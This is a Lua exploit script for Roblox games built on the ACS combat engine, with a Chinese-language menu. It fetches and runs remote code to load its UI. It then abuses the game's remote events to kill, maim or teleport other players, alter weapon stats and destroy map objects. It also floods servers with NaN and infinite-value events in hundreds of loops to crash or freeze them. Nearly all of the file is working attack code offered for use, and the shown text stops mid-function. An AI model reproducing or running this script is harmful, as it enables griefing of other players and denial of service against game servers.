local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/YUTIANnb666/YUTIAN/refs/heads/main/YUT-UI",true))()
local window = Library:new("孙笑川制作")

local acsTab = window:Tab("ACS",'6035145364')

local run = function(func) func() end

run(function()
    _G.ACSConfig = {
        detectedACS = {
            Exists = false,
            Version = "Unknown",
            Events = {},
            Eventos = {},
            HasConfig = false
        },
        breachPower = 3,
        suppressionLoop = nil,
        whizzLoop = nil,
        selectedPlayer = nil,
        autoAttackLoop = nil,
        autoHealLoop = nil,
        autoSuppressLoop = nil,
        autoWhizzLoop = nil,
        autoKillLoop = nil
    }
end)

run(function()
    _G.ACSServices = {
        Players = game:GetService("Players"),
        ReplicatedStorage = game:GetService("ReplicatedStorage"),
        Workspace = game:GetService("Workspace"),
        RunService = game:GetService("RunService"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        Camera = game:GetService("Workspace").CurrentCamera
    }
end)

run(function()
    local rs = _G.ACSServices.ReplicatedStorage
    local config = _G.ACSConfig
    
    local function detectACS()
        local acs = rs:FindFirstChild("ACS_Engine")
        
        if acs then
            config.detectedACS.Exists = true
            
            local events = acs:FindFirstChild("Events")
            local eventos = acs:FindFirstChild("Eventos")
            
            if events then
                config.detectedACS.Events = {
                    Refil = events:FindFirstChild("Refil") ~= nil,
                    Suppression = events:FindFirstChild("Suppression") ~= nil,
                    Whizz = events:FindFirstChild("Whizz") ~= nil,
                    Damage = events:FindFirstChild("Damage") ~= nil
                }
            end
            
            if eventos then
                config.detectedACS.Eventos = {
                    Damage = eventos:FindFirstChild("Damage") ~= nil,
                    Breach = eventos:FindFirstChild("Breach") ~= nil,
                    Recarregar = eventos:FindFirstChild("Recarregar") ~= nil,
                    ServerBullet = eventos:FindFirstChild("ServerBullet") ~= nil,
                    Suppression = eventos:FindFirstChild("Suppression") ~= nil,
                    Whizz = eventos:FindFirstChild("Whizz") ~= nil,
                    Hit = eventos:FindFirstChild("Hit") ~= nil,
                    Drag = eventos:FindFirstChild("Drag") ~= nil,
                    Atirar = eventos:FindFirstChild("Atirar") ~= nil,
                    DoorEvent = eventos:FindFirstChild("DoorEvent") ~= nil
                }
            end
            
            local success = pcall(function()
                require(acs.GameRules.Config)
            end)
            config.detectedACS.HasConfig = success
            
            if config.detectedACS.Eventos.Damage and config.detectedACS.Eventos.Recarregar then
                config.detectedACS.Version = "1.7.5"
            elseif config.detectedACS.Events.Refil and config.detectedACS.HasConfig then
                config.detectedACS.Version = "2.0.1+"
            elseif eventos and not events then
                config.detectedACS.Version = "1.7.x"
            elseif events and not eventos then
                config.detectedACS.Version = "2.0.x"
            else
                config.detectedACS.Version = "Mixed/Unknown"
            end
        end
        
        return config.detectedACS.Exists
    end
    
    _G.ACSCore = {
        detect = detectACS,
        getDetected = function() return config.detectedACS end
    }
end)

run(function()
    local config = _G.ACSConfig
    local core = _G.ACSCore
    local Players = _G.ACSServices.Players
    local ReplicatedStorage = _G.ACSServices.ReplicatedStorage
    local Workspace = _G.ACSServices.Workspace
    local RunService = _G.ACSServices.RunService
    local Camera = _G.ACSServices.Camera
    local LocalPlayer = _G.ACSServices.LocalPlayer
    
    local function getDamageEvent()
        if config.detectedACS.Eventos.Damage then
            return ReplicatedStorage["ACS_Engine"].Eventos.Damage
        elseif config.detectedACS.Events.Damage then
            return ReplicatedStorage["ACS_Engine"].Events.Damage
        end
        return nil
    end
    
    local function getSuppressionEvent()
        if config.detectedACS.Eventos.Suppression then
            return ReplicatedStorage["ACS_Engine"].Eventos.Suppression
        elseif config.detectedACS.Events.Suppression then
            return ReplicatedStorage["ACS_Engine"].Events.Suppression
        end
        return nil
    end
    
    local function getWhizzEvent()
        if config.detectedACS.Eventos.Whizz then
            return ReplicatedStorage["ACS_Engine"].Eventos.Whizz
        elseif config.detectedACS.Events.Whizz then
            return ReplicatedStorage["ACS_Engine"].Events.Whizz
        end
        return nil
    end
    
    local function getRefilEvent()
        if config.detectedACS.Events.Refil then
            return ReplicatedStorage["ACS_Engine"].Events.Refil
        end
        return nil
    end
    
    local function getRecarregarEvent()
        if config.detectedACS.Eventos.Recarregar then
            return ReplicatedStorage["ACS_Engine"].Eventos.Recarregar
        end
        return nil
    end
    
    local function notify(title, text, duration)
    duration = duration or 3
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title or "提示",
            Text = text or "",
            Duration = duration,
            Button1 = "确定"
        })
    end)
end
    
    _G.ACSNotify = notify
    
    local checkSection = acsTab:section("状态检测", true)
    local statusLabel = checkSection:Label("检测中...")
    local versionLabel = checkSection:Label("版本: 未知")
    
    checkSection:Button("重新检测", function()
        core.detect()
        if config.detectedACS.Exists then
            statusLabel.Text = "✅ ACS 已检测到"
            versionLabel.Text = "版本: " .. config.detectedACS.Version
        else
            statusLabel.Text = "❌ 未检测到 ACS"
            versionLabel.Text = "版本: N/A"
        end
        notify("系统检测", config.detectedACS.Exists and "ACS " .. config.detectedACS.Version or "无ACS", 3)
    end)
    
    local playerList = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(playerList, p.Name)
        end
    end
    
    Players.PlayerAdded:Connect(function(p)
        if p ~= LocalPlayer then
            table.insert(playerList, p.Name)
        end
    end)
    
    Players.PlayerRemoving:Connect(function(p)
        for i, name in ipairs(playerList) do
            if name == p.Name then
                table.remove(playerList, i)
                break
            end
        end
    end)
    
    local targetSection = acsTab:section("目标玩家操作", false)
    targetSection:Dropdown("选择目标玩家", "acs_target_player", playerList, function(selected)
        config.selectedPlayer = selected
    end)
    
    targetSection:Button("传送到玩家", function()
        if not config.selectedPlayer then return end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = target.Character.HumanoidRootPart.CFrame
                notify("传送", "已传送到 " .. target.Name, 2)
            end
        end
    end)
    
    targetSection:Button("击杀选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, math.huge, 0, 0)
                notify("成功", "已击杀 " .. target.Name, 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("致残选中玩家 (1HP)", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, 1, 0, 0)
                notify("成功", "已将 " .. target.Name .. " 致残至1HP", 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("治疗选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, -999999999, 0, 0)
                notify("成功", "已治疗 " .. target.Name, 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("上帝模式选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, -math.huge, 0, 0)
                notify("成功", "已为 " .. target.Name .. " 开启上帝模式", 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("压制选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "未找到 Suppression 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            pcall(function()
                suppressionEvent:FireServer(target, 666, 666, 666)
                notify("成功", "已压制 " .. target.Name, 2)
            end)
        end
    end)
    
    targetSection:Button("子弹呼啸选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "未找到 Whizz 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            pcall(function()
                whizzEvent:FireServer(target)
                notify("成功", "已对 " .. target.Name .. " 使用子弹呼啸", 2)
            end)
        end
    end)
    
    targetSection:Button("给选中玩家无限弹药", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local refilEvent = getRefilEvent()
        local recarregarEvent = getRecarregarEvent()
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            if refilEvent then
                pcall(function()
                    refilEvent:FireServer(target)
                    notify("成功", "已给 " .. target.Name .. " 无限弹药", 2)
                end)
            elseif recarregarEvent then
                pcall(function()
                    recarregarEvent:FireServer(target)
                    notify("成功", "已给 " .. target.Name .. " 无限弹药", 2)
                end)
            else
                notify("错误", "未找到弹药补给事件", 2)
            end
        end
    end)
    
    targetSection:Button("拖拽选中玩家", function()
        local eventos = ReplicatedStorage["ACS_Engine"] and ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Drag then
            notify("错误", "未找到 Drag 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if target and hrp then
            pcall(function()
                eventos.Drag:FireServer(target, hrp.Position)
                notify("成功", "已拖拽 " .. target.Name, 2)
            end)
        end
    end)
    
    local attackSection = acsTab:section("全局攻击", false)
    
    attackSection:Button("杀死所有人", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local killedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                    killedCount = killedCount + 1
                end)
            end
        end
        notify("全局攻击", "已杀死 " .. killedCount .. " 名玩家", 2)
    end)
    
    local autoKillEnabled = false
    attackSection:Toggle("自动秒杀循环", "auto_kill", false, function(state)
        autoKillEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoKillLoop = task.spawn(function()
                while autoKillEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                            pcall(function()
                                damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                            end)
                        end
                    end
                    task.wait(2)
                end
            end)
            notify("自动秒杀", "已开启自动秒杀循环", 2)
        else
            if config.autoKillLoop then
                task.cancel(config.autoKillLoop)
                config.autoKillLoop = nil
            end
            notify("自动秒杀", "已关闭自动秒杀循环", 2)
        end
    end)
    
    attackSection:Button("杀死所有人(包括自己)", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已杀死所有玩家(包括你自己)", 2)
    end)
    
    attackSection:Button("致残所有人 (1HP)", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 1, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已将所有人致残至1HP", 2)
    end)
    
    attackSection:Button("治疗所有人", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, -999999999, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已治疗所有人", 2)
    end)
    
    local autoHealEnabled = false
    attackSection:Toggle("自动治疗循环", "auto_heal", false, function(state)
        autoHealEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoHealLoop = task.spawn(function()
                while autoHealEnabled do
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        pcall(function()
                            damageEvent:FireServer(LocalPlayer.Character.Humanoid, -99999, 0, 0)
                        end)
                    end
                    task.wait(0.5)
                end
            end)
            notify("自动治疗", "已开启自动治疗循环", 2)
        else
            if config.autoHealLoop then
                task.cancel(config.autoHealLoop)
                config.autoHealLoop = nil
            end
            notify("自动治疗", "已关闭自动治疗循环", 2)
        end
    end)
    
    attackSection:Button("治疗队友", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local healedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Team == LocalPlayer.Team and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, -9999, 0, 0)
                    healedCount = healedCount + 1
                end)
            end
        end
        notify("治疗", "已治疗 " .. healedCount .. " 名队友", 2)
    end)
    
    attackSection:Button("伤害队友", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local damagedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Team == LocalPlayer.Team and player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 50, 0, 0)
                    damagedCount = damagedCount + 1
                end)
            end
        end
        notify("伤害", "已伤害 " .. damagedCount .. " 名队友", 2)
    end)
    
    attackSection:Button("范围爆炸伤害", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local killedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 999, 0, 0)
                    killedCount = killedCount + 1
                end)
            end
        end
        notify("范围攻击", "已对全图 " .. killedCount .. " 名玩家造成爆炸伤害", 2)
    end)
    
    attackSection:Button("范围Hit爆炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"] and ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local args = {
                hrp.Position,
                Instance.new("Part"),
                Vector3.yAxis,
                Enum.Material.Plastic,
                {
                    ExPressure = 999999,
                    ExpRadius = 100,
                    ExplosiveHit = true,
                    ExplosionDamage = 500
                }
            }
            eventos.Hit:FireServer(unpack(args))
            notify("范围爆炸", "已触发范围Hit爆炸", 2)
        end
    end)
    
    local autoAttackEnabled = false
    attackSection:Toggle("自动攻击循环", "auto_attack", false, function(state)
        autoAttackEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoAttackLoop = task.spawn(function()
                while autoAttackEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                            pcall(function()
                                damageEvent:FireServer(player.Character.Humanoid, 50, 0, 0)
                            end)
                        end
                    end
                    task.wait(1)
                end
            end)
            notify("自动攻击", "已开启自动攻击循环", 2)
        else
            if config.autoAttackLoop then
                task.cancel(config.autoAttackLoop)
                config.autoAttackLoop = nil
            end
            notify("自动攻击", "已关闭自动攻击循环", 2)
        end
    end)
    
    attackSection:Button("远程击杀", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local camera = Camera
        local target = camera:FindFirstChild("Focus")
        if target and target.Parent and target.Parent.Parent then
            local player = Players:GetPlayerFromCharacter(target.Parent.Parent)
            if player and player ~= LocalPlayer then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                    notify("远程击杀", "已击杀 " .. player.Name, 2)
                end)
            end
        end
    end)
    
    local weaponSection = acsTab:section("武器修改 (需装备武器)", false)
    
    weaponSection:Button("一键无敌武器", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then
            notify("错误", "请先装备武器", 2)
            return
        end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.Firerate = 100000
                settings.SuppressMaxDistance = 100
                settings.SuppressTime = 30
                settings.Distance = 1000000
                settings.BDrop = 0.01
                settings.BSpeed = 6000
                settings.BulletPenetration = 100
                settings.FallOfDamage = 0
                settings.MaxSway = 0
                settings.VRecoil = {0, 0}
                settings.HRecoil = {0, 0}
                settings.AimRecover = 0
                settings.RecoilPunch = 0
                settings.VPunchBase = 0
                settings.HPunchBase = 0
                settings.DPunchBase = 0
                settings.MinSpread = 0
                settings.MaxSpread = 0
                notify("武器修改", "已应用无敌配置", 2)
            end)
        end
    end)
    
    weaponSection:Button("一击必杀", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.HeadDamage = {130, 140}
                settings.TorsoDamage = {130, 140}
                settings.Limbs = {130, 140}
                notify("武器修改", "已应用一击必杀", 2)
            end)
        end
    end)
    
    weaponSection:Button("爆炸子弹", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.ExplosiveHit = true
                settings.ExPressure = 1000000000000
                settings.ExpRadius = 100000000000
                settings.BulletLightBrightness = 10
                notify("武器修改", "已应用爆炸子弹", 2)
            end)
        end
    end)
    
    weaponSection:Button("无限弹药", function()
        for _, v in pairs(getgc(true)) do
            if type(v) == 'table' and rawget(v, 'Ammo') then
                pcall(function()
                    v.Ammo = 9e9
                    v.StoredAmmo = 9e9
                    v.MaxStoredAmmo = 9e9
                end)
            end
        end
        notify("武器修改", "已应用无限弹药", 2)
    end)
    
    weaponSection:Button("获取所有武器", function()
        local refilEvent = getRefilEvent()
        if refilEvent then
            pcall(function()
                refilEvent:FireServer(LocalPlayer)
                notify("武器", "已获取所有武器", 2)
            end)
        else
            notify("错误", "未找到武器获取事件", 2)
        end
    end)
    
    local configSection = acsTab:section("本地配置 (2.0.1)", false)
    
    configSection:Toggle("无限体力", "acs_stamina", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableStamina = not state
        end)
    end)
    
    configSection:Toggle("禁用坠落伤害", "acs_fall", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableFallDamage = not state
        end)
    end)
    
    configSection:Toggle("允许连跳", "acs_bhop", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.AntiBunnyHop = not state
        end)
    end)
    
    configSection:Toggle("无限子弹", "acs_infinite_ammo", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.InfiniteAmmo = state
            notify("配置", state and "已开启无限子弹" or "已关闭无限子弹", 2)
        end)
    end)
    
    configSection:Toggle("无敌模式", "acs_godmode", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.GodMode = state
            notify("配置", state and "已开启无敌模式" or "已关闭无敌模式", 2)
        end)
    end)
    
    configSection:Toggle("无限呼吸", "acs_breath", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableBreath = not state
        end)
    end)
    
    configSection:Toggle("无限冲刺", "acs_sprint", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableSprintStamina = not state
        end)
    end)
    
    local breachSection = acsTab:section("破拆/干扰", false)
    
    breachSection:Slider("破拆强度", "acs_breach", 3, 1, 50, false, function(value)
        config.breachPower = value
    end)
    
    breachSection:Button("位置破拆", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pcall(function()
                ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                    config.breachPower or 3,
                    {Fortified = {}, Destroyable = Workspace},
                    CFrame.new(),
                    CFrame.new(),
                    {CFrame = hrp.CFrame, Size = {X = 5, Y = 5, Z = 5}}
                )
            end)
        end
    end)
    
    breachSection:Button("全局破拆", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                99,
                {Fortified = {}, Destroyable = Workspace},
                CFrame.new(),
                CFrame.new(),
                {CFrame = {}, Size = {}}
            )
        end)
        notify("破拆", "已尝试全局破拆", 2)
    end)
    
    breachSection:Button("破坏所有物体", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                999,
                {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                CFrame.new(),
                CFrame.new(),
                {CFrame = CFrame.new(), Size = {X = 999, Y = 999, Z = 999}}
            )
        end)
        notify("破拆", "已尝试破坏所有物体", 2)
    end)
    
    breachSection:Button("破坏玩家建筑", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        local buildings = {}
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChild("Humanoid") == nil then
                table.insert(buildings, v)
            end
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                50,
                {Fortified = buildings, Destroyable = buildings},
                CFrame.new(),
                CFrame.new(),
                {CFrame = CFrame.new(), Size = {X = 50, Y = 50, Z = 50}}
            )
        end)
        notify("破拆", "已尝试破坏玩家建筑", 2)
    end)
    
    local spamSection = acsTab:section("全局干扰", false)
    
    spamSection:Toggle("全局压制干扰", "acs_suppress", false, function(state)
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.suppressionLoop = task.spawn(function()
                while config.suppressionLoop do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                suppressionEvent:FireServer(player, 666, 666, 666)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("全局干扰", "已开启全局压制", 2)
        else
            if config.suppressionLoop then 
                task.cancel(config.suppressionLoop) 
                config.suppressionLoop = nil 
            end
            notify("全局干扰", "已关闭全局压制", 2)
        end
    end)
    
    local autoSuppressEnabled = false
    spamSection:Toggle("自动压制循环", "auto_suppress", false, function(state)
        autoSuppressEnabled = state
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.autoSuppressLoop = task.spawn(function()
                while autoSuppressEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                suppressionEvent:FireServer(player, 999, 999, 999)
                            end)
                        end
                    end
                    task.wait(1)
                end
            end)
            notify("自动压制", "已开启自动压制循环", 2)
        else
            if config.autoSuppressLoop then
                task.cancel(config.autoSuppressLoop)
                config.autoSuppressLoop = nil
            end
            notify("自动压制", "已关闭自动压制循环", 2)
        end
    end)
    
    spamSection:Toggle("全局子弹呼啸", "acs_whizz", false, function(state)
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.whizzLoop = task.spawn(function()
                while config.whizzLoop do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                whizzEvent:FireServer(player)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("全局干扰", "已开启全局子弹呼啸", 2)
        else
            if config.whizzLoop then 
                task.cancel(config.whizzLoop) 
                config.whizzLoop = nil 
            end
            notify("全局干扰", "已关闭全局子弹呼啸", 2)
        end
    end)
    
    local autoWhizzEnabled = false
    spamSection:Toggle("自动呼啸循环", "auto_whizz", false, function(state)
        autoWhizzEnabled = state
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        if state then
            config.autoWhizzLoop = task.spawn(function()
                while autoWhizzEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            pcall(function()
                                whizzEvent:FireServer(player)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("自动呼啸", "已开启自动呼啸循环", 2)
        else
            if config.autoWhizzLoop then
                task.cancel(config.autoWhizzLoop)
                config.autoWhizzLoop = nil
            end
            notify("自动呼啸", "已关闭自动呼啸循环", 2)
        end
    end)
    
    spamSection:Button("崩溃服务器 (NaN)", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 30 do
            task.spawn(function()
                while true do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(0/0, 0/0, 0/0),
                            Vector3.new(0/0, 0/0, 0/0)
                        )
                    end)
                    task.wait()
                end
            end)
        end
        notify("警告", "已尝试崩溃服务器", 2)
    end)
    
    spamSection:Button("服务器卡顿攻击", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 50 do
            task.spawn(function()
                for j = 1, 100 do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(math.random(), math.random(), math.random()),
                            Vector3.new(math.random(), math.random(), math.random())
                        )
                    end)
                end
            end)
        end
        notify("警告", "已尝试服务器卡顿攻击", 2)
    end)
    
    spamSection:Button("服务器延迟攻击", function()
        if not config.detectedACS.Eventos.ServerBullet then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        for i = 1, 100 do
            task.spawn(function()
                for j = 1, 50 do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.ServerBullet:FireServer(
                            Vector3.new(1/0, 1/0, 1/0),
                            Vector3.new(1/0, 1/0, 1/0)
                        )
                    end)
                end
            end)
        end
        notify("警告", "已尝试服务器延迟攻击", 2)
    end)
    
    spamSection:Button("完全卡死服务器", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                        end
                        if eventos.Suppression then
                            eventos.Suppression:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已开始攻击服务器，服务器将完全卡死", 2)
    end)
    
    spamSection:Button("超级NaN风暴", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
